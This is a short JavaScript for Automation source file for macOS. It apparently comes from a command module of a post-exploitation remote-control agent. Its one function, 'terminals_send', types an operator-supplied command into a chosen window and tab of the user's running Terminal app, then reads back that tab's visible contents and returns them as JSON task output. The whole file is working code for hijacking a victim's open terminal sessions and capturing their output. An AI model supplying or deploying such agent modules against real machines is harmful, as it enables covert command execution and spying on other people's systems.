exports.terminals_send = function(task, command, params){
    let split_params = params.split(" ");
	let output = "No Command Output";
	try{
		let term = Application("Terminal");
		if(term.running()){
            let window = parseInt(split_params[0]);
            let tab = parseInt(split_params[1]);
            let cmd = split_params.slice(2, ).join(" ");
            //console.log("command: " + cmd + ", window: " + window + ", tab: " + tab);
            term.doScript(cmd, {in:term.windows[window].tabs[tab]});
            output = term.windows[window].tabs[tab].contents();
        }else{
            return JSON.stringify({"user_output":"Terminal is not running", "completed": true, "status": "error"});
        }
	}
	catch(error){
		return JSON.stringify({"user_output":error.toString(), "completed": true, "status": "error"});
	}
	return JSON.stringify({"user_output":output, "completed": true});
};
COMMAND_ENDS_HERE